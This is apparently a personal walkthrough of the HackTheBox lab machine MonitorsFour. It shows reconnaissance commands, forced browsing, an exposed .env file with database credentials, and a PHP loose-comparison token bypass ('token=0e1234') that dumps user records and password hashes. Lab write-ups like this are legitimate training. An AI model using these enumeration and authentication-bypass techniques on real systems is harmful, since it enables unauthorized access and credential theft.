“Talent hits a target no one else can hit. Genius hits a target no one else can see.” - Arthur Schopenhauer


for todays machine, lets do a windows one, an active one, MonitorsFour - rated as Easy - Windows since we are a bit tired of linux 


as always connect to the hackthebox VPN, then we spawn the machine, and remember that mindset + methodology is more important than just typing in random tool commands that give you too much information that is not needed.

speed comes from clarity, not rushing. Do not just run scripts and expect luck, insted inspect, document and analyze. 

after our machine finally boots we get an IP 10.129.5.240 ---- as always I recommend a good sporify "hacking" playlist to get in the mood, always

ping 10.129.5.240                                  
PING 10.129.5.240 (10.129.5.240) 56(84) bytes of data.
64 bytes from 10.129.5.240: icmp_seq=1 ttl=127 time=180 ms
64 bytes from 10.129.5.240: icmp_seq=2 ttl=127 time=177 ms
64 bytes from 10.129.5.240: icmp_seq=3 ttl=127 time=181 ms
^C
--- 10.129.5.240 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 176.628/178.948/180.670/1.703 ms

we have positive connection to our ip target, no packet loss, 

simply typing in the IP to our browser redirects to http://monitorsfour.htb/ yet we get a "This site can’t be reached" so we need to add to /etc/hosts file

sudo nano /etc/hosts
add in at the bottom the target ip and the target machine name
-> 
control o -> control x

cat /etc/hosts
127.0.0.1	localhost

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.129.26.134 artificial.htb
10.129.232.59 code.htb
10.129.229.66   2million.htb
10.129.5.50 conversor.htb
10.129.5.240 monitorsfour.htb


we pull up the page, MonitorsFour is a networking and IT infrastructure services company, delivering end-to-end networking solutions. That obviously needs our help. we see several issues already. 

lets start the enumeration process

nmap -sC -sV monitorsfour.htb -oA monitorsfour-services

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 16:06 CST
Nmap scan report for monitorsfour.htb (10.129.5.240)
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.45 seconds


key observations: nginx web server
The site sets a PHPSESSID cookie - HttpOnly flag is not set
Port 5985/tcp is open — WinRM (Microsoft HTTPAPI 2.0) -> some research tells us that this is for powershell access- admin access

from here we go to the login page, very simple, we go to inspect -> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MonitorsFour - Login</title>
    <link rel="icon" type="image/x-icon" href="static/admin/assets/images/logo.ico">
    <!-- Global stylesheets -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,100,500,700,900" rel="stylesheet" type="text/css">
    <link href="static/admin/assets/css/icons/icomoon/styles.css" rel="stylesheet" type="text/css">
    <link href="static/admin/assets/css/minified/bootstrap.min.css" rel="stylesheet" type="text/css">
    <link href="static/admin/assets/css/minified/core.min.css" rel="stylesheet" type="text/css">
    <link href="static/admin/assets/css/minified/components.min.css" rel="stylesheet" type="text/css">
    <link href="static/admin/assets/css/minified/colors.min.css" rel="stylesheet" type="text/css">
    <!-- /global stylesheets -->

    <!-- Core JS files -->
    <script type="text/javascript" src="static/admin/assets/js/plugins/loaders/pace.min.js"></script>
    <script type="text/javascript" src="static/admin/assets/js/core/libraries/jquery.min.js"></script>
    <script type="text/javascript" src="static/admin/assets/js/core/libraries/bootstrap.min.js"></script>
    <script type="text/javascript" src="static/admin/assets/js/plugins/loaders/blockui.min.js"></script>
    <!-- /core JS files -->


------------------

and we see something alarming, type="text/javascript" src="static/admin/assets/js/core/libraries/jquery.min.js"></script>

yes the folder named admin, and admin panel / admin theme in usage, the login page is probably part of an admin module. With assests being loaded from static/admin/assets/... this is lazy cmon guys 

on the main page -> inspect -> 
  <!-- jQuery Min JS -->
  <script src="static/js/jquery-min.js"></script>

  <!-- Popper Min JS -->
  <script src="static/js/popper.min.js"></script>
  <!-- Bootstrap Min JS -->
  <script src="static/js/bootstrap.min.js"></script>
  <!-- Owl Carousel Min JS -->
  <script src="static/js/owl.carousel.min.js"></script>
  <!-- Owl Plugins JS -->
  <script src="static/js/plugins.js"></script>
  <!-- Smooth scroll JS -->
  <script src="static/js/smoothscroll.js"></script>


  <!-- Custom JS -->
  <script src="static/js/custom.js"></script> some more site-wide front-end behavior, anyways lets see feroxbuster a strong directory/ "Forced Browsing" enumeration tool 


(-----㉿----)-[~]
└─$ feroxbuster -u http://monitorsfour.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,txt,html,bak,old,zip
I wont post everything because it will only be redundent, but a bit is 200      GET       96l      239w     4340c http://monitorsfour.htb/views/login.php
200      GET      338l      982w    13688c http://monitorsfour.htb/views/index.php
200      GET      215l      592w     9229c http://monitorsfour.htb/views/admin/api.php
200      GET      321l      800w    13987c http://monitorsfour.htb/views/admin/users.php
301      GET        7l       11w      162c http://monitorsfour.htb/controllers => http://monitorsfour.htb/controllers/
200      GET       20l       36w      302c http://monitorsfour.htb/views/admin/footer.php
200      GET      288l      862w    12112c http://monitorsfour.htb/views/

----> this is a huge enumeration win, and sloppy by the monitorsfour site devs. 


T       96l      239w     4340c http://monitorsfour.htb/views/login.php
200      GET      338l      982w    13688c http://monitorsfour.htb/views/index.php
200      GET      215l      592w     9229c http://monitorsfour.htb/views/admin/api.php
200      GET      321l      800w    13987c http://monitorsfour.htb/views/admin/users.php
301      GET        7l       11w      162c http://monitorsfour.htb/controllers => http://monitorsfour.htb/controllers/



lets recap, Error disclosure (full filesystem paths, router file/line numbers).
Direct access to /views/* and /views/admin/*
WinRM on 5985



lets go through http://monitorsfour.htb/views/admin/users.php & http://monitorsfour.htb/views/admin/api.php 

once we pull them up we can see that admin pages are accessible without a session, we only used feroxbuster and even then without feroxbuster, the inspect element on the webpages would have presented these vulnerabilities 



http://monitorsfour.htb/views/admin/users.php -> gives us a page, -> Main
Dashboard
Tasks & Invoicing
Tasks
Invoices
Customer & User Management
Users
Customers
Changelogs
Changelog
API
Generate API Key
Home
Users
Users
Add User 

then http://monitorsfour.htb/views/admin/api.php -> 

Main
Dashboard
Tasks & Invoicing
Tasks
Invoices
Customer & User Management
Users
Customers
Changelogs
Changelog
API
Generate API Key
Home
API Keys
API Key Management
Generate and manage your personal API key for automation purposes.

Generate New API Key


all bad for them, good for us. 
we might be able to add in a user, and generate an API key all without creating a login, 

lets try for both, without burpsuite, lets inspect -> network 

http://monitorsfour.htb/views/admin/api.php -> Generate API Key -> http://monitorsfour.htb/login 

http://monitorsfour.htb/views/admin/users.php -> Add User -> Warning: Undefined variable $superuser in /var/www/app/views/admin/users.php on line 44
#	Username	Name	Position	D.O.B	Start Date	Salary
No users found.
Add User -> empty fields to add in a user, 


Direct forced-browsing to /views/admin/* still works, but any “real” privileged action you click (Generate API Key) is routed to /login, 
meaning the backend action endpoint is enforcing auth but the /view itself isn’t.

lets do an html dump, curl -s http://monitorsfour.htb/views/admin/users.php | sed -n '1,200p'

we get good results -> 

/admin/dashboard

/admin/tasks

/admin/invoices

/admin/users

/admin/customers

/admin/changelog

/admin/api

So /views/admin/users.php is basically a template, but the intended entrypoints are the /admin/* routes.


sooo forced-browsing bypass is possible, but so far all actions are gated 



------------------


Request URL http://monitorsfour.htb/api/v1/auth Request Method POST Status Code 302 
Found Remote Address hmmm when we try to add a user with that role, with a simple name and password, 
then we go to login, typed that in we get a Invalid credentials, check your username and password then try again!

What this tells us ---> 

/api/v1/auth is authentication only

soooo  ---->

add user UI did not create a user
backend correctly enforces auth on /api/v1/auth

The “Add User” modal is purely cosmetic when accessed via forced browsing 

so this was a good misdirection, we like this box, lets look for config / env files now 

curl -i http://monitorsfour.htb/controllers/ HTTP/1.1 403 Forbidden Server: 

nginx Date: Sun, 14 Dec 2025 00:06:30 GMT Content-Type: text/html Content-Length: 146 Connection: keep-alive


----> nothing 

curl -i http://monitorsfour.htb/.env HTTP/1.1 200 OK Server: nginx Date: Sun, 14 Dec 2025 00:07:18 GMT Content-Type: application/octet-stream Content-Length: 97 
Last-Modified: Sat, 13 Sep 2025 05:37:28 GMT Connection: keep-alive ETag: "68c50318-61" 
Accept-Ranges: bytes DB_HOST=mariadb DB_PORT=3306 DB_NAME=monitorsfour_db DB_USER=monitorsdbuser DB_PASS=f37p2j8f4t0r 


wow look at that!!! a simple curl and we get something very good, we found the intended pivot. Critical find!

DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r


lets try the login page and test the following

Username: monitorsdbuser & Password: f37p2j8f4t0r 

---------------> Invalid credentials, check your username and password then try again!

so thats not the right place, hmmm remmeber that port? Port 5985/tcp is open — WinRM (Microsoft HTTPAPI 2.0) 

we try again here and it doesnt work either -----> 

These are database-only credentials, not OS or app-login creds. 

MariaDB is internal-only (expected) ----> DB port 3306 is not exposed ----------->>> So the DB creds must be abused through the app

That means the next step is data extraction, not auth guessing. -----------> 


hmmmmm,  

nmap -p 3306 -Pn monitorsfour.htb                     

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 18:21 CST
Nmap scan report for monitorsfour.htb (10.129.6.1)
Host is up.

PORT     STATE    SERVICE
3306/tcp filtered mysql

Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds 



hmmmmm,

curl -i -X POST http://monitorsfour.htb/api/v1/auth \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=test&password=test"

HTTP/1.1 302 Found
Server: nginx
Date: Sun, 14 Dec 2025 00:22:01 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.3.27
Set-Cookie: PHPSESSID=ba0449c9d7ee317a40ed7fa3510cd8d5; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login



sooo thats why we cannot connect directly, ---->  3306/tcp filtered mysql --->  there’s no direct DB access --->  no “easy SQLi on login” path. ---> well then lol 


we try for LFI but find nothing, 


hmmmm, lets try some more fuffing, admittly, here to make this shortwe we will only place the one that found us the next step, but in reality this took me longer than I care to admit 

ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.monitorsfour.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
________________________________________________

:: Progress: [40/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: 
Erro:: Progress: [40/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [40/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [49/19966] :: Job [1/1] :: 0 req/sec :: 

Duration: [0:00:00] :: Erro:: Progress: [73/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: Progress: [104/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: 

Err:: Progress: [143/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [172/19966] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: Progress: [192/19966] :: Job [1/1] :: 234 req/sec :: Duration: [0:00:01] :: 

E:: Progress: [222/19966] :: Job [1/1] :: 236 req/sec :: Duration: [0:00:01] :: E:: Progress: [260/19966] :: Job [1/1] :: 242 req/sec :: Duration: [0:00:01] :: E:: Progress: [286/19966] :: Job [1/1] :: 235 req/sec :: Duration: [0:00:01] 

:: Ecacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 232ms]




------------------- :: Ecacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 232ms]
 we found something!!! 

A virtual host named ecacti.monitorsfour.htb exists!!!

Add the vhost to /etc/hosts

echo "10.129.6.1 ecacti.monitorsfour.htb" | sudo tee -a /etc/hosts


So what is Cacti?
Cacti is a PHP network monitoring tool, usuaally very vulnerable & not recommended. 

Cacti is also mainly used internally. 

since Cacti is only internally accessed, we need to pivot our thinking towards architecture. Remember, Cacti is internal-only. So after some youtube videos on Cacti -> 
the server nginx blocks direct access to cacti, although the main app "talks" to cacti, -> hence, the main app-> cacti communication path should be exploitable. 

The box is named MonitorsFour, why? because we have proven that the architecture is based on multiple layers of "monitoring" 

the public site ---> monitorsfour.htb

internal admin dashboard ---> /admin/ views (found by forced browsing)

backend API layer ---> /api/v1/

internal  service (Cacti) ---> ecacti.monitorsfour.htb (blocked externally,)

Total of four application layers. so while Cacti is blocked to outsiders, the server nginx trusts internal routing.... 

so here we need an endpoint that send requests (the server nginx trusts internal routing) ---> talks to Cacti, 


we need a page that MonitorsFour makes outbound HTTP requests. & returns an internal address +  destination is derived from user input + can be tampered with 

---> http://monitorsfour.htb/user ---> {"error":"Missing token parameter"} ---> inspect -> network, Request URL http://monitorsfour.htb/user Request Method GET Status Code 200 OK Remote Address 10.129.6.1:80
Referrer Policy strict-origin-when-cross-origin ontent-type text/html; charset=UTF-8 date Sun, 14 Dec 2025 01:05:05 GMT expires Thu, 19 Nov 1981 08:52:00 GMT pragma no-cache server nginx

now why is this the key???

Because /user page is an endpoint that is meant to be called by something else... --> “Missing token parameter” ---> should return “Please log in”. --> makes a good candidate for SSRF --->  makes outbound HTTP requests ---> 
returns an internal address / destination internal ---> destination from user input is therefore tamperable!!



└─$ ffuf -c -u "http://monitorsfour.htb/user?token=FUZZ" -w php_loose_comparison.txt 


---> curl "http://monitorsfour.htb/user?token=0e1234" [{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user",
"token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":
"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary"
:"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16",
"start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":
"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]


we got it!!!! we had to try a dozen of word list but we found it!



